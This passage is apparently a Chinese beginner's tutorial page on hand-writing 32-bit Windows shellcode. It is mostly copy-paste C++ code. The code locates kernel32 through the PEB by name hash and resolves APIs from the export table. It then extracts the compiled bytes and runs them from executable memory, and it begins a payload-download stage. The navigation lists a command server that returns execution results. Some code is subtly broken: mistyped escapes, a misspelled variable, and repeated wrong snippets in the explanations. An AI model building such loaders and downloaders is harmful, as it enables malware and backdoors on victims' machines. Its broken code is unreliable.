+        修复导入表
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        运行
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        四、服务器编写
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="四、服务器编写">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#flaskhello-world" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        flask的第一个hello world
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="flask的第一个hello world">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        逐行解释分析
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        客户端 -&gt; 服务端接口
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#-_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        客户端执行结果 -&gt; 服务端
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        服务端输入命令&amp;服务端获取回显
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_19" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        测试
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_20" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        五、客户端的第一个指令
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="五、客户端的第一个指令">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_21" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        循环链接服务端
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="循环链接服务端">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_22" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        分析
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="shellcode">零基础shellcode</h1>
+<p><strong>！！ 免责声明！！</strong> <strong><em>我是一个零代码基础的人，这个文章是在学习、实际操作 作者huoji 于2022年发布的文章《填鸭式shellcode编写教程》的一个学习记录，这里面记录我对这个教程的理解和疑惑！！！</em></strong>
+简单说一下shellcode是啥，Shellcode 本质上是一段二进制机器指令，直接是一段“已经编译好的指令”，塞进内存就执行。
+他就是一个是没有任何系统支持的裸奔代码，所以限制很多：</p>
+<ul>
+<li><strong>1</strong>、无法依赖 PE 结构、没有重定位表。由于现在系统都有 ASLR ，系统每次运行地址都变，因此不能写死地址，否则运行一次就崩</li>
+<li><strong>2</strong>、没有 .data / .rdata，不能用全局变量，只能用栈</li>
+<li><strong>3</strong>.没有导入表（IAT），不能直接调用 API</li>
+</ul>
+<hr />
+<ul>
+<li><strong>了解一下恶意代码流程：</strong>
+  <br>
+  双击 exe
+  <br>
+  ↓
+  <br>
+  CreateProcess
+  <br>
+  ↓
+  <br>
+  内核创建 EPROCESS
+  <br>
+  ↓
+  <br>
+  初始化进程
+  <br>
+  ↓
+  <br>
+  创建 PEB
+  <br>
+  ↓
+  <br>
+  加载 DLL
+  <br>
+  ↓
+  <br>
+  创建线程（TEB）
+  <br>
+  ↓
+  <br>
+  <strong>线程开始执行</strong>
+  <br>
+  ↓
+  <br>
+  （需要系统功能）
+  <br>
+  ↓
+  <br>
+  访问 TEB（获取 PEB 地址）
+  <br>
+  ↓
+  <br>
+  访问 PEB（拿模块信息）
+  <br>
+  ↓
+  <br>
+  找到 DLL（kernel32.dll）
+  <br>
+  ↓
+  <br>
+  解析导出表（手动解析GetProcAddress，再用它找其他 API如 VirtualAlloc）
+  <br>
+  ↓
+  <br>
+  找到 API
+  <br>
+  ↓
+  <br>
+  调用 API
+  <br>
+  ↓
+  <br>
+  如果涉及安全操作则系统检查 Token
+  <br>
+  ↓
+  <br>
+  执行成功 / 失败</li>
+</ul>
+<p>根据以上，我们来解决重定向这个问题，思路就是：</p>
+<ul>
+<li><strong>第一步</strong>: 获取kernel32的地址；</li>
+<li><strong>第二步</strong>: 解析导出表；</li>
+<li><strong>第三步</strong>：通过导出表的名字定位到函数,拿到最关键的两个API（getprocessaddress、loadlibrary），进而从手动找地址 迈向 动态解析API、随便调用的稳定且可复用的工业化产品。</li>
+</ul>
+<hr />
+<p>ok，粗略捋清思路就开始吧！
+首先打开VS，选择控制台应用：
+<img alt="如图" src="../image/1.png" />
+由于我们写的是32位的shellcode，这里就选择x86，如下图：
+<img alt="如图" src="../image/2.png" />
+准备好后，正式开始！
+ps：作为参考，我会在全文最后放出完整代码</p>
+<hr />
+<h2 id="shellcode_1">一、编写shellcode</h2>
+<h3 id="kernel32">解决重定向第一步: 获取kernel32的地址</h3>
+<p>复制粘贴这一坨东西，如下图：
+<img alt="如图" src="../image/7.png" />
+这坨代码干了3件事情：</p>
+<ol>
+<li>找到 PEB（进程信息总表）</li>
+<li>从 PEB 找到 LDR（模块列表）</li>
+<li>从 LDR 找到 kernel32.dll</li>
+</ol>
+<p>简单总结一下就是：它目的是在内存里找到 kernel32.dll 的地址，为啥找这个？因为后面要用：LoadLibrary、GetProcAddress，而这两个函数都在 kernel32.dll 里！</p>
+<pre><code>#include &lt;iostream&gt;
+#include &lt;Windows.h&gt;
+#define DEREF( name )*(UINT_PTR *)(name)
+typedef struct _UNICODE_STR
+{
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR pBuffer;
+} UNICODE_STR, * PUNICODE_STR;
+
+// WinDbg&gt; dt -v ntdll!_PEB_LDR_DATA
+typedef struct _PEB_LDR_DATA //, 7 elements, 0x28 bytes
+{
+    DWORD dwLength;
+    DWORD dwInitialized;
+    LPVOID lpSsHandle;
+    LIST_ENTRY InLoadOrderModuleList;
+    LIST_ENTRY InMemoryOrderModuleList;
+    LIST_ENTRY InInitializationOrderModuleList;
+    LPVOID lpEntryInProgress;
+} PEB_LDR_DATA, * PPEB_LDR_DATA;
+
+// WinDbg&gt; dt -v ntdll!_PEB_FREE_BLOCK
+typedef struct _PEB_FREE_BLOCK // 2 elements, 0x8 bytes
+{
+    struct _PEB_FREE_BLOCK* pNext;
+    DWORD dwSize;
+} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;
+
+
+// struct _PEB is defined in Winternl.h but it is incomplete
+// WinDbg&gt; dt -v ntdll!_PEB
+typedef struct __PEB // 65 elements, 0x210 bytes
+{
+    BYTE bInheritedAddressSpace;
+    BYTE bReadImageFileExecOptions;
+    BYTE bBeingDebugged;
+    BYTE bSpareBool;
+    LPVOID lpMutant;
+    LPVOID lpImageBaseAddress;
+    PPEB_LDR_DATA pLdr;
+    LPVOID lpProcessParameters;
+    LPVOID lpSubSystemData;
+    LPVOID lpProcessHeap;
+    PRTL_CRITICAL_SECTION pFastPebLock;
+    LPVOID lpFastPebLockRoutine;
+    LPVOID lpFastPebUnlockRoutine;
+    DWORD dwEnvironmentUpdateCount;
+    LPVOID lpKernelCallbackTable;
+    DWORD dwSystemReserved;
+    DWORD dwAtlThunkSListPtr32;
+    PPEB_FREE_BLOCK pFreeList;
+    DWORD dwTlsExpansionCounter;
+    LPVOID lpTlsBitmap;
+    DWORD dwTlsBitmapBits[2];
+    LPVOID lpReadOnlySharedMemoryBase;
+    LPVOID lpReadOnlySharedMemoryHeap;
+    LPVOID lpReadOnlyStaticServerData;
+    LPVOID lpAnsiCodePageData;
+    LPVOID lpOemCodePageData;
+    LPVOID lpUnicodeCaseTableData;
+    DWORD dwNumberOfProcessors;
+    DWORD dwNtGlobalFlag;
+    LARGE_INTEGER liCriticalSectionTimeout;
+    DWORD dwHeapSegmentReserve;
+    DWORD dwHeapSegmentCommit;
+    DWORD dwHeapDeCommitTotalFreeThreshold;
+    DWORD dwHeapDeCommitFreeBlockThreshold;
+    DWORD dwNumberOfHeaps;
+    DWORD dwMaximumNumberOfHeaps;
+    LPVOID lpProcessHeaps;
+    LPVOID lpGdiSharedHandleTable;
+    LPVOID lpProcessStarterHelper;
+    DWORD dwGdiDCAttributeList;
+    LPVOID lpLoaderLock;
+    DWORD dwOSMajorVersion;
+    DWORD dwOSMinorVersion;
+    WORD wOSBuildNumber;
+    WORD wOSCSDVersion;
+    DWORD dwOSPlatformId;
+    DWORD dwImageSubsystem;
+    DWORD dwImageSubsystemMajorVersion;
+    DWORD dwImageSubsystemMinorVersion;
+    DWORD dwImageProcessAffinityMask;
+    DWORD dwGdiHandleBuffer[34];
+    LPVOID lpPostProcessInitRoutine;
+    LPVOID lpTlsExpansionBitmap;
+    DWORD dwTlsExpansionBitmapBits[32];
+    DWORD dwSessionId;
+    ULARGE_INTEGER liAppCompatFlags;
+    ULARGE_INTEGER liAppCompatFlagsUser;
+    LPVOID lppShimData;
+    LPVOID lpAppCompatInfo;
+    UNICODE_STR usCSDVersion;
+    LPVOID lpActivationContextData;
+    LPVOID lpProcessAssemblyStorageMap;
+    LPVOID lpSystemDefaultActivationContextData;
+    LPVOID lpSystemAssemblyStorageMap;
+    DWORD dwMinimumStackCommit;
+} _PEB;
+
+typedef struct _LDR_DATA_TABLE_ENTRY
+{
+    //LIST_ENTRY InLoadOrderLinks; // As we search from PPEB_LDR_DATA-&gt;InMemoryOrderModuleList we dont use the first entry.
+    LIST_ENTRY InMemoryOrderModuleList;
+    LIST_ENTRY InInitializationOrderModuleList;
+    PVOID DllBase;
+    PVOID EntryPoint;
+    ULONG SizeOfImage;
+    UNICODE_STR FullDllName;
+    UNICODE_STR BaseDllName;
+    ULONG Flags;
+    SHORT LoadCount;
+    SHORT TlsIndex;
+    LIST_ENTRY HashTableEntry;
+    ULONG TimeDateStamp;
+} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;
+
+void shellcode_start() {
+    //代码不用理解,可以直接复制粘贴.
+    uint64_t base_address = NULL;
+    //0.读取fs,找到peb
+    base_address = __readfsdword(0x30);
+    unsigned short m_counter;
+    uint64_t ldr_table;
+    uint64_t dll_name;
+    uint64_t hash_name;
+    uint64_t kernel32_base = 0;
+
+    base_address = (uint64_t)((_PEB*)base_address)-&gt;pLdr;
+    ldr_table =
+        (uint64_t)((PPEB_LDR_DATA)base_address)-&gt;InMemoryOrderModuleList.Flink;
+    //1. 通过peb里面的LDR找到kernel32的地址
+    while (ldr_table) {
+        dll_name =
+            (uint64_t)((PLDR_DATA_TABLE_ENTRY)ldr_table)-&gt;BaseDllName.pBuffer;
+        m_counter = ((PLDR_DATA_TABLE_ENTRY)ldr_table)-&gt;BaseDllName.Length;
+        hash_name = 0;
+        do {
+            hash_name = _rotr((unsigned long)hash_name, 13);
+            if (*((unsigned char*)dll_name) &gt;= 'a')
+                hash_name += *((unsigned char*)dll_name) - 0x20;
+            else
+                hash_name += *((unsigned char*)dll_name);
+            dll_name++;
+        } while (--m_counter);
+        //hash name其实是基于dll_name的因为我们也不想取到其他的莫名其妙的东西,做个简单地hash会准确很多
+        //如果你不想用hashname,那么你可以printf(&quot;%wZ&quot;,dll_name);观察一下dll name自己想一下新的思路
+        if ((unsigned long)hash_name == 0x6A4ABC5B) {
+            //这就是kernel.dll的地址了
+            kenrle32_base = (uint64_t)((PLDR_DATA_TABLE_ENTRY)ldr_table)-&gt;DllBase;
+            break;
+        }
+        ldr_table = DEREF(ldr_table);
+        if (kenrle32_base != 0) {
+            //找到了退出
+            break;
+        }
+    }
+    if (kenrle32_base == 0) {
+        __debugbreak();
+    }
+    printf(&quot;kernel32: %p /n&quot;, kenrle32_base);
+}
+
+int main()
+{
+    shellcode_start();
+    std::cout &lt;&lt; &quot;Hello World!/n&quot;;
+    system(&quot;pause&quot;);
+}
+
+</code></pre>
+<h4 id="_1">逐句分析环节</h4>
+<p>不懂具体啥意思?行，我们逐句看：
+<strong>struct结构</strong>
+这些 struct 是干嘛的？这些是 Windows 内部结构体（相当于“数据说明书”）,因为 shellcode 没 API (不能GetModuleHandle、EnumProcessModules)可用，所以只能自己解析内存结构</p>
+<pre><code>typedef struct _PEB
+typedef struct _PEB_LDR_DATA
+typedef struct _LDR_DATA_TABLE_ENTRY
+</code></pre>
+<p><strong>接着找到PEB</strong></p>
+<pre><code>base_address = __readfsdword(0x30);
+</code></pre>
+<p><strong>找到LDR</strong>
+从 PEB 找 LDR（当前进程加载的所有 DLL，如kernel32.dll、ntdll.dll、user32.dll）</p>
+<pre><code>base_address = __readfsdword(0x30);
+</code></pre>
+<p><strong>计算 hash</strong>
+为什么不直接写字符串？因为 shellcode 不能用字符串（会进 .rdata），且容易被检测</p>
+<pre><code>base_address = __readfsdword(0x30);
+</code></pre>
+<p><strong>匹配 kernel32</strong></p>
+<pre><code>base_address = __readfsdword(0x30);
+</code></pre>
+<p><strong>拿到kernel32.dll 在内存中的地址</strong>
+拿到地址（最关键），这就是kernel32.dll 在内存中的地址</p>
+<pre><code>base_address = __readfsdword(0x30);
+</code></pre>
+<p><strong>继续遍历</strong></p>
+<pre><code>base_address = __readfsdword(0x30);
+</code></pre>
+<p><strong>输出kernel32.dll 的内存地址</strong></p>
+<pre><code>base_address = __readfsdword(0x30);
+</code></pre>
+<p>总结一下就是：
+找到系统“进程信息入口”（PEB） ——&gt; 打开“已加载DLL列表” ——&gt; 一个个翻 ——&gt; 找到 kernel32.dll ——&gt; 记住它的地址</p>
+<p>好，现在点击运行，看看情况怎么样
+<img alt="如图" src="../image/3.png" />
+弹出了这个，完美找到了kernel32的地址了！
+<img alt="如图" src="../image/4.png" />
+如果担心有问题，可以检查一下，查看模块列表,确认一下是否有误
+<img alt="如图" src="../image/5.png" />
+没问题！
+<img alt="如图" src="../image/6.png" /></p>
+<h3 id="_2">解决重定向第二步: 解析导出表</h3>
+<p>目前我们已经找到了kernel32.dll，接下来就要从这个dll里面找到出函数地址，
+dll本质是一个pe文件，其结构为：
+<code>DOS头</code> → <code>NT头</code> →<code>数据目录</code> → <code>导出表</code></p>
+<p>所以我们要做的就是：</p>
+<ul>
+<li>1.获取PE头（统称，其实就是DOS头、 NT头）</li>
+<li>2.通过PE头获取导出表</li>
+<li>3.通过导出表获取到函数</li>
+</ul>
+<p>以下代码贴在刚刚你的printf后,同时删掉之前的printf</p>
+<pre><code>typedef HMODULE(WINAPI* GetProcAddressT)(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);
+    typedef HMODULE(WINAPI* LoadLibraryAT)(_In_ LPCSTR lpLibFileName);
+    GetProcAddressT fnGetProcAddress = NULL;
+    LoadLibraryAT fnLoadlibrary = NULL;
+
+    //别在意这边的大小写驼峰混乱,因为是两套代码拼接的,懒得改了....
+    UINT_PTR uiAddressArray = NULL;
+    UINT_PTR uiNameArray = NULL;
+    UINT_PTR uiNameOrdinals = NULL;
+    PIMAGE_NT_HEADERS32 pNtHeaders32 = NULL;
+    PIMAGE_NT_HEADERS64 pNtHeaders64 = NULL;
+    PIMAGE_DATA_DIRECTORY pDataDirectory = NULL;
+    PIMAGE_EXPORT_DIRECTORY pExportDirectory = NULL;
+    // 解析PE头
+    pNtHeaders32 = (PIMAGE_NT_HEADERS32)(kenrle32_base + ((PIMAGE_DOS_HEADER)kenrle32_base)-&gt;e_lfanew);
+    pNtHeaders64 = (PIMAGE_NT_HEADERS64)(kenrle32_base + ((PIMAGE_DOS_HEADER)kenrle32_base)-&gt;e_lfanew);
+    // 拿到导出表
+    pDataDirectory = (PIMAGE_DATA_DIRECTORY)&amp;pNtHeaders32-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+    // 遍历导出表
+    pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(kenrle32_base + pDataDirectory-&gt;VirtualAddress);
+    uiAddressArray = (kenrle32_base + pExportDirectory-&gt;AddressOfFunctions);
+    uiNameArray = (kenrle32_base + pExportDirectory-&gt;AddressOfNames);
+    uiNameOrdinals = (kenrle32_base + pExportDirectory-&gt;AddressOfNameOrdinals);
+
+    unsigned long dwCounter = pExportDirectory-&gt;NumberOfNames;
+
+    char str1[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', '/0' };
+    char str2[] = { 'L','o','a','d','L','i','b','r','a','r','y','A','/0' };
+    while (dwCounter--)
+    {
+        char* cpExportedFunctionName = (char*)(kenrle32_base + DEREF_32(uiNameArray));
+        char* matchPtr = &amp;str1[0];
+        int ret = 0;
+        while (!(ret = *cpExportedFunctionName - *matchPtr) &amp;&amp; *cpExportedFunctionName)
+        {
+            cpExportedFunctionName++;
+            matchPtr++;
+        }
+        if (ret == 0)
+        {
+            uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(unsigned long));
+            fnGetProcAddress = (GetProcAddressT)(kenrle32_base + DEREF_32(uiAddressArray));
+        }
+        else {
+            cpExportedFunctionName = (char*)(kenrle32_base + DEREF_32(uiNameArray));
+            char* matchPtr = &amp;str2[0];
+            ret = 0;
+            while (!(ret = *cpExportedFunctionName - *matchPtr) &amp;&amp; *cpExportedFunctionName)
+            {
+                cpExportedFunctionName++;
+                matchPtr++;
+            }
+            if (ret == 0)
+            {
+                uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(unsigned long));
+                fnLoadlibrary = (LoadLibraryAT)(kenrle32_base + DEREF_32(uiAddressArray));
+            }
+        }
+        if (fnLoadlibrary &amp;&amp; fnGetProcAddress) {
+            break;
+        }
+        uiNameArray += sizeof(unsigned long);
+        uiNameOrdinals += sizeof(unsigned short);
+    }
+    if (fnLoadlibrary == NULL || fnGetProcAddress == NULL) {
+        __debugbreak();
+    }
+    printf(&quot;kernel32: %p fnGetProcAddress :%p/n&quot;, fnLoadlibrary, fnGetProcAddress);
+</code></pre>
+<p>看不懂这一坨代码他干了啥？那咱们继续一句一句解析！</p>
+<h4 id="_3">逐句分析环节</h4>
+<p><strong>找到 NT 头</strong>
+这里e_lfanew = 偏移</p>
+<pre><code>pNtHeaders = base + e_lfanew;
+</code></pre>
+<p><strong>找到导出表</strong>
+里面包含了：函数地址表AddressOfFunctions、函数名字表AddressOfNames、序号表AddressOfNameOrdinals</p>
+<pre><code>DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
+</code></pre>
+<p><strong>遍历函数</strong></p>
+<pre><code>while (dwCounter--)
+</code></pre>
+<p>每次取一个函数名字：</p>
+<pre><code>char* name = ...
+</code></pre>
+<p><strong>找目标函数</strong>
+对比字符串</p>
+<pre><code>&quot;GetProcAddress&quot;
+&quot;LoadLibraryA&quot;
+</code></pre>
+<p><strong>找到后通过名字找到地址</strong>
+名字 → ordinal → 地址
+最终得到两个非常重要的函数指针：fnGetProcAddress、fnLoadlibrary</p>
+<p>ok,回到我们的实际操作。
+把上面的代码贴替换掉printf
+<img alt="如图" src="../image/8.png" /></p>
+<p>如果遇到如下报错，是以为没有声明，加个声明就能解决
+<code>#define DEREF_32( name )*(unsigned long *)(name)</code>
+<code>#define DEREF_16( name )*(unsigned short *)(name)</code>
+<img alt="如图" src="../image/9.png" /></p>
+<p>现在来运行一下看看
+<img alt="如图" src="../image/10.png" /></p>
+<p>没错吧！运行结构跟上面分析的一直：找到了函数指针fnGetProcAddress的地址
+<img alt="如图" src="../image/11.png" /></p>
+<h3 id="_4">解决重定向第三步:进一步升级，动态解析+可复用</h3>
+<p>通过导出表的名字定位到函数,拿到最关键的两个API（getprocessaddress、loadlibrary），进而从手动找地址 迈向 动态解析API、随便调用的稳定且可复用的工业化产品。</p>
+<p>现在试着弹出第一个hello world的信息库吧！
+复制粘贴下面这坨代码，然后运行</p>
+<pre><code>   if (fnLoadlibrary == NULL || fnGetProcAddress == NULL) {
+        __debugbreak();
+    }
+    char str3[] = { 'U','S','E','R','3','2','.','d','l','l','/0' };
+    char str4[] = { 'M','e','s','s','a','g','e','B','o','x','A','/0' };
+    char str5[] = { 'h','e','l','l','o',' ','w','o','r','l','d','/0' };
+    typedef int (WINAPI* MessageBoxAT)(_In_opt_ HWND hWnd,_In_opt_ LPCSTR lpText,_In_opt_ LPCSTR lpCaption,_In_ UINT uType);
+    MessageBoxAT pMessageBoxA = (MessageBoxAT)fnGetProcAddress(fnLoadlibrary(str3), str4);
+    if (pMessageBoxA == NULL) {
+        __debugbreak();
+    }
+    pMessageBoxA(NULL, str5, NULL ,NULL);
+</code></pre>
+<h4 id="_5">逐句分析环节</h4>
+<p><strong>调用 MessageBox</strong>
+第二步的时候已经有了LoadLibraryA、GetProcAddress</p>
+<pre><code>LoadLibrary(&quot;user32.dll&quot;)
+GetProcAddress(&quot;MessageBoxA&quot;)
+</code></pre>
+<p>调用</p>
+<pre><code>MessageBoxA(...)
+</code></pre>
+<p><strong><em>?字符串为啥要写成这样？</em></strong>
+因为user32.dll" 会进 .rdata，而shellcode 访问不到</p>
+<pre><code>char str3[] = { 'U','S','E','R','3','2','.','d','l','l','/0' };
+</code></pre>
+<p>ok，回到操作：
+复制粘贴上面那坨代码
+<img alt="如图" src="../image/12.png" /></p>
+<p>点击运行，发现报错了！可能是函数地址取错
+<img alt="如图" src="../image/13.png" />
+我们去看看getprocessaddress、loadlibrary是不是出了什么问题
+点击下方局部变量板块
+<img alt="如图" src="../image/14.png" />
+找到getprocessaddress、loadlibrary，分别鼠标右键转到反汇编，如下图：
+看fngetprocessaddress转到反汇编如下：
+75056780 mov edi,edi
+是正常的
+<img alt="如图" src="../image/15.png" />
+看fnloadlibrary转到反汇编如下：
+750DA39F inc edx
+<img alt="如图" src="../image/16.png" />
+是这里出现了问题！
+为啥？</p>
+<ol>
+<li>在 Windows 里，一个正常函数开头通常是</li>
+</ol>
+<pre><code>push rbp
+mov rbp, rsp
+sub rsp, xxx
+</code></pre>
+<p>或</p>
+<pre><code>mov r10, rcx
+mov eax, xxx
+syscall
+</code></pre>
+<p>或</p>
+<pre><code>jmp xxx   ; 跳板/IAT
+</code></pre>
+<ol>
+<li>函数之间通常会有int 3</li>
+</ol>
+<p>而fnloadlibrary它没有这些函数入口特征，是它出错了</p>
+<p>这两个关键的函数指针一对一错：GetProcAddress是正确的，而LoadLibrary是错误的。</p>
+<p>那么说明不是我们的整体逻辑出错，如果是PEB、kernel32地址、PE解析出错的话那两个函数都会错</p>
+<p>因此问题是出在取函数地址的这个环节上</p>
+<p>而只有这一段在决定函数地址</p>
+<pre><code>uiAddressArray
+uiNameArray
+uiNameOrdinals
+</code></pre>
+<p>问题就出现在这里,地址数据第二次又加了一次，</p>
+<pre><code>uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(unsigned long));
+fnLoadlibrary = (LoadLibraryAT)(kenrle32_base + DEREF_32(uiAddressArray));
+</code></pre>
+<p>替换一下出错的那部分代码</p>
+<pre><code>        if (ret == 0)
+        {
+            uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(unsigned long));
+            fnGetProcAddress = (GetProcAddressT)(kernel32_base + DEREF_32(uiAddressArray));
+        }
+        else {
+            cpExportedFunctionName = (char*)(kernel32_base + DEREF_32(uiNameArray));
+            char* matchPtr = &amp;str2[0];
+            ret = 0;
+            while (!(ret = *cpExportedFunctionName - *matchPtr) &amp;&amp; *cpExportedFunctionName)
+            {
+                cpExportedFunctionName++;
+                matchPtr++;
+            }
+            if (ret == 0)
+            {
+                uiAddressArray = (kernel32_base + pExportDirectory-&gt;AddressOfFunctions);
+                uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(unsigned long));
+                fnLoadlibrary = (LoadLibraryAT)(kernel32_base + DEREF_32(uiAddressArray));
+            }
+        }
+</code></pre>
+<p>关键变化：函数地址 = 起点 + 当前索引偏移
+每次都重新从“函数表起点”开始算，这样就不会产生累加偏移指到乱七八糟的地方了。</p>
+<p>如图
+<img alt="如图" src="../image/17.png" />
+修复完毕，点击运行，成功解决
+<img alt="如图" src="../image/18.png" /></p>
+<h3 id="shellcode_2">现在实现shellcode吧！</h3>
+<p>现在我们还停留在function,而我们的目标是编写shellcode
+所以我们要把它变成shellcode,
+在shellcode_start的函数下面放一个shellcode_end:</p>
+<pre><code>void shellcode_end() {
+    __debugbreak();
+}
+</code></pre>
+<p><img alt="如图" src="../image/19.png" />
+接着在main里面去掉之前的shellcode_start,生成模式从debug改成release</p>
+<p><img alt="如图" src="../image/67.png" /></p>
+<p>然后复制下面这坨代码:</p>
+<pre><code>    const auto start_address = (uint32_t)shellcode_start;
+    const auto shellcode_size = (uint32_t)shellcode_end - (uint32_t)start_address;
+    for (size_t i = 0; i &lt; shellcode_size; i++)
+    {
+        auto sig_code = ((unsigned char*)start_address)[i];
+        printf(&quot;,0x%02X&quot;, sig_code);
+    }
+</code></pre>
+<h4 id="_6">逐句分析环节</h4>
+<p>这坨代码啥意思？</p>
+<p><strong>确定 shellcode 范围</strong></p>
+<pre><code>void shellcode_start() { ... }
+
+void shellcode_end() {
+    __debugbreak();
+}
+</code></pre>
+<p><strong>获取函数地址（关键）</strong></p>
+<pre><code>const auto start_address = (uint32_t)shellcode_start;
+const auto shellcode_size = (uint32_t)shellcode_end - (uint32_t)start_address;
+</code></pre>
+<p><strong>读取机器码</strong></p>
+<pre><code>for (size_t i = 0; i &lt; shellcode_size; i++)
+{
+    auto sig_code = ((unsigned char*)start_address)[i];
+    printf(&quot;,0x%02X&quot;, sig_code);
+}
+</code></pre>
+<p>回到操作，把上面那坨代码复制粘贴进去后，
+<img alt="如图" src="../image/20.png" />
+由于VS会优化代码，增加security cookie
+而前者会,后者会让你的shellcode出现空指针异常(因为security cookie是全局变量,但是我们shellcode压根不能用)
+所以你必须关掉它:
+关闭security cookie:
+在菜单栏点击<code>项目</code>，点击<code>属性</code>会跳出属性页弹框
+<img alt="如图" src="../image/21.png" />
+点击<code>&gt;c/c++</code>,找到<code>所有选项</code>,关闭安全检查
+<img alt="如图" src="../image/22.png" />
+关闭优化
+<img alt="如图" src="../image/23.png" />
+这是配置release的,记住！生成shellcode的时候<strong><em>不能用debug生成</em></strong>,否则你的函数地址会是错的！debug的gate函数而不是真正的函数!
+运行后，可以看到这么一大坨东西！你已经成功一大半了宝贝！
+<img alt="如图" src="../image/24.png" />
+现在复制粘贴下面这坨代码，然后再复制粘贴上面图片运行后弹出的这一大串数字（shellcode数组）到<code>char shellcode[] = { .... };</code>的括号{}里面，用于内存加载执行</p>
+<pre><code>    char shellcode[] = { .... };
+    PVOID p = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memcpy(p, shellcode, sizeof(shellcode));
+    typedef void(__stdcall* door_code) ();
+    door_code run_shellcode = (door_code)p;
+    run_shellcode();
+</code></pre>
+<p>等会儿，这段啥意思？</p>
+<h4 id="_7">逐句分析</h4>
+<p><strong>得到 shellcode数组</strong></p>
+<pre><code>char shellcode[] = {
+    0x55,0x8B,0xEC...
+};
+</code></pre>
+<p>申请可执行内存</p>
+<pre><code>PVOID p = VirtualAlloc(
+    NULL,
+    sizeof(shellcode),
+    MEM_COMMIT | MEM_RESERVE,
+    PAGE_EXECUTE_READWRITE
+);
+</code></pre>
+<p>复制shellcode</p>
+<pre><code>memcpy(p, shellcode, sizeof(shellcode));
+</code></pre>
+<p>强行当函数执行</p>
+<pre><code>typedef void(__stdcall* door_code) ();
+door_code run_shellcode = (door_code)p;
+run_shellcode();
+</code></pre>
+<p>ok，回到操作，复制粘贴上面那坨东西，注意别把前面的逗号也复制粘贴了
+<img alt="如图" src="../image/25.png" />
+点击运行
+<img alt="如图" src="../image/26.png" />
+锵锵锵锵！shellcode的hell world大功告成！！
+<img alt="如图" src="../image/27.png" /></p>
+<hr />
+<h2 id="payload">二、payload下载</h2>
+<p>现在咱们开始进入真正的实战型 shellcode核心能力：下载 payload！
+首先准备一个http服务器,这里我使用了hfs</p>
+<h3 id="url">准备结构体（初始化），进行URL解析</h3>
+<p>将下方这坨代码贴在 <em>拿到 fnGetProcAddress / fnLoadLibrary</em> 之后
+<em>调用 WinHttpCrackUrl</em> 之前</p>
+<pre><code> typedef struct _URL_INFO
+    {
+        WCHAR szScheme[36];
+        WCHAR szHostName[36];
+        WCHAR szUserName[36];
+        WCHAR szPassword[36];
+        WCHAR szUrlPath[36];
+        WCHAR szExtraInfo[36];
+    }URL_INFO, * PURL_INFO;
+
+    _URL_INFO url = { 0 };
+    URL_COMPONENTSW lpUrlComponents = { 0 };
+    lpUrlComponents.dwStructSize = sizeof(lpUrlComponents);
+    lpUrlComponents.lpszExtraInfo = url.szExtraInfo;
+    lpUrlComponents.lpszHostName = url.szHostName;
+    lpUrlComponents.lpszPassword = url.szPassword;
+    lpUrlComponents.lpszScheme = url.szScheme;
+    lpUrlComponents.lpszUrlPath = url.szUrlPath;
+    lpUrlComponents.lpszUserName = url.szUserName;
+
+    lpUrlComponents.dwExtraInfoLength =
+        lpUrlComponents.dwHostNameLength =
+        lpUrlComponents.dwPasswordLength =
+        lpUrlComponents.dwSchemeLength =
